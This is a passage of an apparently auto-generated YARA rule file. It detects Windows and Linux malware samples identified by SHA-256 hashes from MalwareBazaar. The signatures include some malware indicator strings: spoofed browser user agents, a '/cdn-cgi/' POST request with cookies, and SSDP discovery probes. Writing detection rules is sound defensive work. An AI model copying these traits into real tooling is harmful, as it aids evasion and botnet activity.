        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_61e52468c5bc383180a4a4400c8e703279dd83238042ff66fb07aef6e15b38f6
{
    meta:
        description = "Auto ML: 61e52468c5bc383180a4a4400c8e703279dd83238042ff66fb07aef6e15b38f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<datetimeMenu_SelectedIndexChanged>b__13_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 551KB
        and all of them
}

rule Windows_61e7d79adc7462d205a363d9a925f3cb994ffc42c1aad00edc034501b2be5a6d
{
    meta:
        description = "Auto ML: 61e7d79adc7462d205a363d9a925f3cb994ffc42c1aad00edc034501b2be5a6d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 611KB
        and all of them
}

rule Windows_621425400cfcefaa6e9f1bc2bbac63f8b4aa23c81c9b805098724c73e5031021
{
    meta:
        description = "Auto ML: 621425400cfcefaa6e9f1bc2bbac63f8b4aa23c81c9b805098724c73e5031021"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 681KB
        and all of them
}

rule Windows_6269c0afcf708d6b8bb3d7fa200009f6a177d60b6c5f9b174278dab56f716af1
{
    meta:
        description = "Auto ML: 6269c0afcf708d6b8bb3d7fa200009f6a177d60b6c5f9b174278dab56f716af1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4761KB
        and all of them
}

rule Windows_627515b63bc7b2eafff1a45e9d6ec4f9f2ad2c78ed07aa044d0fe836ed4894a4
{
    meta:
        description = "Auto ML: 627515b63bc7b2eafff1a45e9d6ec4f9f2ad2c78ed07aa044d0fe836ed4894a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 867KB
        and all of them
}

rule Windows_629e031747e94b66f85f83711433a1c3d084ac0a57fbcc58f970be04de2d48cb
{
    meta:
        description = "Auto ML: 629e031747e94b66f85f83711433a1c3d084ac0a57fbcc58f970be04de2d48cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4491KB
        and all of them
}

rule Windows_62bfc227410b8cc5e8a3f6b6a7344e9ce2a91481278c7d0d2afae8ea3eb095ce
{
    meta:
        description = "Auto ML: 62bfc227410b8cc5e8a3f6b6a7344e9ce2a91481278c7d0d2afae8ea3eb095ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1594KB
        and all of them
}

rule Linux_62c0df2b5fab25055637bc768cc8614f352d552aed567e78f296ac3d8e7d4d9f
{
    meta:
        description = "Auto ML: 62c0df2b5fab25055637bc768cc8614f352d552aed567e78f296ac3d8e7d4d9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "0EPH;H"
        $s4 = "eR&HHx"
        $s5 = "0N^NuO"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB
        and all of them
}

rule Windows_63dbf0286931720b4fd562818540297d3b830e2b0cb5b96bd5413d8dce78446f
{
    meta:
        description = "Auto ML: 63dbf0286931720b4fd562818540297d3b830e2b0cb5b96bd5413d8dce78446f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "D@A`PVR"
        $s5 = "E2PQPE"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB
        and all of them
}

rule Windows_63f30d7f027b58f513b600e27d0120b86041d5fa11134baae00d782c678fa5d2
{
    meta:
        description = "Auto ML: 63f30d7f027b58f513b600e27d0120b86041d5fa11134baae00d782c678fa5d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".text0"
        $s5 = "`.text1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7029KB
        and all of them
}

rule Linux_083b593e8fb1326f4f9dab5f614f211d70a961ab72371e18b61e02d5fdb296e8
{
    meta:
        description = "Auto ML: 083b593e8fb1326f4f9dab5f614f211d70a961ab72371e18b61e02d5fdb296e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ",E]uM$O"
        $s2 = "Q%=0tD@tw"
        $s3 = "RVk4?oJ"
        $s4 = ":NN6bg<"
        $s5 = "YPFu3H"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_63fecafde6aed53ac007e7a69372eda93dfa06143552644ceee7f032886c1c58
{
    meta:
        description = "Auto ML: 63fecafde6aed53ac007e7a69372eda93dfa06143552644ceee7f032886c1c58"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "__StaticArrayInitTypeSize=400"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 813KB
        and all of them
}

rule Windows_64016346314035c592b6f5d73e5c90881e02dd57fb8ac64008eea5c227c058d2
{
    meta:
        description = "Auto ML: 64016346314035c592b6f5d73e5c90881e02dd57fb8ac64008eea5c227c058d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB
        and all of them
}

rule Windows_640b5f4dde898bd6b61db011e24e27a7e8593eb6711cbdf95a536066dfecf704
{
    meta:
        description = "Auto ML: 640b5f4dde898bd6b61db011e24e27a7e8593eb6711cbdf95a536066dfecf704"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4703KB
        and all of them
}

rule Linux_645866e6fbfeabaeac6d97e3c687a2292a8ba0e0d11b33cafd8b0ec9e5e8603f
{
    meta:
        description = "Auto ML: 645866e6fbfeabaeac6d97e3c687a2292a8ba0e0d11b33cafd8b0ec9e5e8603f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "/proc/net/route"
        $s5 = "(null)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB
        and all of them
}

rule Windows_6463bc82bda33a467207207db0f7b7b765a33b41fc95cee521de62e49e14aa8d
{
    meta:
        description = "Auto ML: 6463bc82bda33a467207207db0f7b7b765a33b41fc95cee521de62e49e14aa8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Wine builtin DLL"
        $s2 = "t be run in DOS mode."
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "timestamp"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 100KB
        and all of them
}

rule Windows_6465402b5a02aa817496718dadffa9885ac091c2b28029b25cda79630abbb45c
{
    meta:
        description = "Auto ML: 6465402b5a02aa817496718dadffa9885ac091c2b28029b25cda79630abbb45c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "DRich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".xeyej"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 456KB
        and all of them
}

rule Windows_64672e440233c0624ba97623be556888f354c3672b6623302be7f2f0e49a8d7b
{
    meta:
        description = "Auto ML: 64672e440233c0624ba97623be556888f354c3672b6623302be7f2f0e49a8d7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $s5 = "%c%c%c%c%c%c%c%c%cMSSE-%d-server"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB
        and all of them
}

rule Linux_6489bd3ed75c7308f7b8c5d1da907c114b4d77d59b9b4c435720ee737b95f712
{
    meta:
        description = "Auto ML: 6489bd3ed75c7308f7b8c5d1da907c114b4d77d59b9b4c435720ee737b95f712"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AUATE1"
        $s2 = "A\\A]A^A_"
        $s3 = "AUATUSH"
        $s4 = "X[]A\\A]A^A_"
        $s5 = "AWAVAUATUH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Windows_648bec40870a8c3abce34fcf5924fcdb02601d7b5561aca406808649ff164a6d
{
    meta:
        description = "Auto ML: 648bec40870a8c3abce34fcf5924fcdb02601d7b5561aca406808649ff164a6d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".jipop"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 229KB
        and all of them
}

rule Windows_648db7c068add14dc5dc857c70840b44570ae14eeeaf179be5780a33a9d2d907
{
    meta:
        description = "Auto ML: 648db7c068add14dc5dc857c70840b44570ae14eeeaf179be5780a33a9d2d907"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "~Rich,q"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "D$<RSP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1135KB
        and all of them
}

rule Windows_086f335efce2f5cc6171e0d707fa659e1db7b282195df9bf28c054a01337f8a1
{
    meta:
        description = "Auto ML: 086f335efce2f5cc6171e0d707fa659e1db7b282195df9bf28c054a01337f8a1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 32KB
        and all of them
}

rule Linux_64a71dcd27b0b121917720b2726f78c21bff7854635b1c7963df902aab407d30
{
    meta:
        description = "Auto ML: 64a71dcd27b0b121917720b2726f78c21bff7854635b1c7963df902aab407d30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB
        and all of them
}

rule Windows_64c5b70529dcba8b234148587332b0dbde7f8ab5f4c0b34b7740bdfdc1ba04c8
{
    meta:
        description = "Auto ML: 64c5b70529dcba8b234148587332b0dbde7f8ab5f4c0b34b7740bdfdc1ba04c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 654KB
        and all of them
}

rule Linux_64ce40182934176edcf9fa7f97507ead52d5da9a9a5f35be2f6a67344d3e9bcd
{
    meta:
        description = "Auto ML: 64ce40182934176edcf9fa7f97507ead52d5da9a9a5f35be2f6a67344d3e9bcd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "[tWeSSE"
        $s2 = "HGhhlKx`I"
        $s3 = ",Hkt|I"
        $s4 = "$kX#\"zkx$"
        $s5 = ",IkGP 0,B"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB
        and all of them
}

rule Windows_65002ea8e5b2e260c24fc287a5c0a39f271f666b4d2087d3f549cf71397abdb9
{
    meta:
        description = "Auto ML: 65002ea8e5b2e260c24fc287a5c0a39f271f666b4d2087d3f549cf71397abdb9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".fudogo"
        $s5 = "@.jijur"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 286KB
        and all of them
}

rule Linux_652b0786d3823c81a6c94a6696e7685ba3b373f0d662e3b2fc4a7ee4c0d3ca37
{
    meta:
        description = "Auto ML: 652b0786d3823c81a6c94a6696e7685ba3b373f0d662e3b2fc4a7ee4c0d3ca37"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "xTc808c"
        $s2 = "}`XPUk"
        $s3 = "Gt$T`X(}iJx|c"
        $s4 = "t |iJxTc"
        $s5 = "KxTi@.|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB
        and all of them
}

rule Windows_6534b09aaf207abaa69df8a5065e0f098f24d547542e6581e52b04d33d276c82
{
    meta:
        description = "Auto ML: 6534b09aaf207abaa69df8a5065e0f098f24d547542e6581e52b04d33d276c82"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PQh(/B"
        $s5 = "jXhp1B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_6580ee7e9fe73274559250783c06a7805723663d8c3fd73c63acc9d3f4803491
{
    meta:
        description = "Auto ML: 6580ee7e9fe73274559250783c06a7805723663d8c3fd73c63acc9d3f4803491"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "RzYf f"
        $s5 = "c OMzea}u"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 695KB
        and all of them
}

rule Linux_658ae1fc3bb053631cdae5cd3c443a7dc76688909a3f6e1bb1f928e734f5afc9
{
    meta:
        description = "Auto ML: 658ae1fc3bb053631cdae5cd3c443a7dc76688909a3f6e1bb1f928e734f5afc9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 131KB
        and all of them
}

rule Windows_65d59cc441cd33c09cc1d83f3097da96414b23480d94ee0bf74477aa0f012588
{
    meta:
        description = "Auto ML: 65d59cc441cd33c09cc1d83f3097da96414b23480d94ee0bf74477aa0f012588"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1564KB
        and all of them
}

rule Linux_65d6c45c5597e86540162e9f0cdc3359e80f930c830eeea510b52d96173d88ea
{
    meta:
        description = "Auto ML: 65d6c45c5597e86540162e9f0cdc3359e80f930c830eeea510b52d96173d88ea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "(vmab/"
        $s3 = ".vQllw["
        $s4 = "APe|l3j"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 135KB
        and all of them
}

rule Windows_00ca497ab0c4a5512a229bc533d71354bf2ef6736154b7f80a631bf50a353ef6
{
    meta:
        description = "Auto ML: 00ca497ab0c4a5512a229bc533d71354bf2ef6736154b7f80a631bf50a353ef6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2992KB
        and all of them
}

rule Linux_0880b43e49128113de2b0b65824c6289a9319e1308fddd125eb5fd30fe1f9778
{
    meta:
        description = "Auto ML: 0880b43e49128113de2b0b65824c6289a9319e1308fddd125eb5fd30fe1f9778"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@N^NuNV"
        $s2 = "N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "LNqNuO"
        $s5 = "*L,KHx"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 163KB
        and all of them
}

rule Windows_65d7365f70305fab7e31aa83c9fa0eab041f4a1c29f04c0e6a1fd43c88f64de9
{
    meta:
        description = "Auto ML: 65d7365f70305fab7e31aa83c9fa0eab041f4a1c29f04c0e6a1fd43c88f64de9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PFv?1y"
        $s2 = "Tqwrq!"
        $s3 = "RTUxQ)"
        $s4 = "ZoPpw*"
        $s5 = "}ZnKqX5Qk"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB
        and all of them
}

rule Windows_66050765be8e3bca709568c2a3e249cd904336a9ed0f7d3ace407f43e7c4501a
{
    meta:
        description = "Auto ML: 66050765be8e3bca709568c2a3e249cd904336a9ed0f7d3ace407f43e7c4501a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "FBs sv"
        $s4 = "R Rw4/a~"
        $s5 = "i _fAc A"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1954KB
        and all of them
}

rule Windows_660d37a0667f9df27e662aa2ad6d228a1f73c54ed72db00ace1b8cd8902f5077
{
    meta:
        description = "Auto ML: 660d37a0667f9df27e662aa2ad6d228a1f73c54ed72db00ace1b8cd8902f5077"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4708KB
        and all of them
}

rule Linux_66141a438dd5b17117400a2f075e8710575c652368493c5d2bb4a9c38cba17d1
{
    meta:
        description = "Auto ML: 66141a438dd5b17117400a2f075e8710575c652368493c5d2bb4a9c38cba17d1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KEs9jP"
        $s2 = "<;.BcS$c_G~"
        $s3 = "NR?8mL"
        $s4 = "qcJim8"
        $s5 = "g:ffNy"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Linux_663612d085e1720a68b9859324d90c179087b282d52bc6011c2c0556a03ea817
{
    meta:
        description = "Auto ML: 663612d085e1720a68b9859324d90c179087b282d52bc6011c2c0556a03ea817"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AVAUATA"
        $s2 = "HcD$dH"
        $s3 = "h[]A\\A]A^A_"
        $s4 = "HcT$4H"
        $s5 = "HcD$dA"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Windows_663d26dcbb8d892f986086c207e27519f16c23846c1c905c3412c3adef674b8d
{
    meta:
        description = "Auto ML: 663d26dcbb8d892f986086c207e27519f16c23846c1c905c3412c3adef674b8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "iRichu"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".ndata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1161KB
        and all of them
}

rule Windows_66694f7dcb467cd242471f76c58bc236c458761d22bcb4682a07605e0d7bd384
{
    meta:
        description = "Auto ML: 66694f7dcb467cd242471f76c58bc236c458761d22bcb4682a07605e0d7bd384"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2419KB
        and all of them
}

rule Windows_667ade680488ead36e7e6cd112f953212c964c0dcbef2fe88923811df818e161
{
    meta:
        description = "Auto ML: 667ade680488ead36e7e6cd112f953212c964c0dcbef2fe88923811df818e161"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1291KB
        and all of them
}

rule Windows_669634a33853f70175e367b9519b29e5ac57ddeb412884c004875344ad2b5165
{
    meta:
        description = "Auto ML: 669634a33853f70175e367b9519b29e5ac57ddeb412884c004875344ad2b5165"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "_hXhS B"
        $s5 = "d UUUU_`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1497KB
        and all of them
}

rule Windows_66b79b9bbc034503f2c6330157047506b561d119031d0dd9d03ff87153e01ec5
{
    meta:
        description = "Auto ML: 66b79b9bbc034503f2c6330157047506b561d119031d0dd9d03ff87153e01ec5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "D@xw7W"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB
        and all of them
}

rule Windows_08e99c84eae02bcadf577873cf34b6f87b718d83b9c8721e849888425ed9450d
{
    meta:
        description = "Auto ML: 08e99c84eae02bcadf577873cf34b6f87b718d83b9c8721e849888425ed9450d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4605KB
        and all of them
}

rule Linux_66de0381a4186a04dd7c52d8110a4d41f695a1395c78006fe6ce9a6e72e2896e
{
    meta:
        description = "Auto ML: 66de0381a4186a04dd7c52d8110a4d41f695a1395c78006fe6ce9a6e72e2896e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "stdout"
        $s4 = "connect"
        $s5 = "memmove"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB
        and all of them
}

rule Windows_66e8cd483fecac0f1cb9ab74cad35ae7c4993b7621c5afedf55801796d1706fc
{
    meta:
        description = "Auto ML: 66e8cd483fecac0f1cb9ab74cad35ae7c4993b7621c5afedf55801796d1706fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "Pj\\h(iB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7366KB
        and all of them
}

rule Windows_6716e245598aa6ca23203f7fdeb0f94fb411570d98bcd11b946839b67bdb5f37
{
    meta:
        description = "Auto ML: 6716e245598aa6ca23203f7fdeb0f94fb411570d98bcd11b946839b67bdb5f37"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
